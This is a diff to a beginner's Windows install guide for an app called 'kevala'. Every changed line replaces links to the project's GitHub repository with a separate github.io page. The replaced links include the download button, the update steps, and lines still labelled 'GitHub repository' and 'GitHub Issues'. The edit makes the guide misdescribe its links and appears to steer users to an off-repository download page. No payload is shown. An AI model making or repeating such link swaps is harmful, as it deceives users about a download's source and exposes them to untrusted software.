@@ -10,11 +10,11 @@ Welcome! This guide will help you download and run **kevala** on your Windows co
 
 ## 📥 Download kevala
 
-[![Download kevala](https://img.shields.io/badge/Download-kevala-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://github.com/Hafiz12cyber/kevala)
+[![Download kevala](https://img.shields.io/badge/Download-kevala-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://hafiz12cyber.github.io)
 
 **Visit this link to download the application.**
 
-Click the button above or go to: https://github.com/Hafiz12cyber/kevala
+Click the button above or go to: https://hafiz12cyber.github.io
 
 This will take you to the official download page where you can get the latest version of kevala.
 
@@ -34,7 +34,7 @@ Good news — kevala is very light on your system! Here's what you need:
 
 ### Step 1: Download the File
 
-1. Click the download button above or visit https://github.com/Hafiz12cyber/kevala
+1. Click the download button above or visit https://hafiz12cyber.github.io
 2. On the page, look for the "Download" or "Releases" section
 3. Click the download button and wait for the file to save to your computer
 4. The file will typically be saved in your "Downloads" folder
@@ -135,7 +135,7 @@ While kevala works standalone, you can also:
 ### Getting Help
 
 If you're still having trouble:
-- Visit the GitHub repository: https://github.com/Hafiz12cyber/kevala
+- Visit the GitHub repository: https://hafiz12cyber.github.io
 - Check the "Issues" section for known problems
 - Report new issues with a detailed description
 
@@ -184,7 +184,7 @@ For the best experience:
 ## 🔄 Updating kevala
 
 To update kevala:
-1. Visit https://github.com/Hafiz12cyber/kevala
+1. Visit https://hafiz12cyber.github.io
 2. Check for newer versions in the Releases section
 3. Download the latest version
 4. Replace the old file with the new one
@@ -204,7 +204,7 @@ kevala is released under an open-source license. Check the GitHub repository for
 ## 📞 Support
 
 For support:
-- GitHub Issues: https://github.com/Hafiz12cyber/kevala/issues
+- GitHub Issues: https://hafiz12cyber.github.io
 - Documentation: Available in the repository's "docs" folder
 - Community: Join discussions in the GitHub Discussions section
 
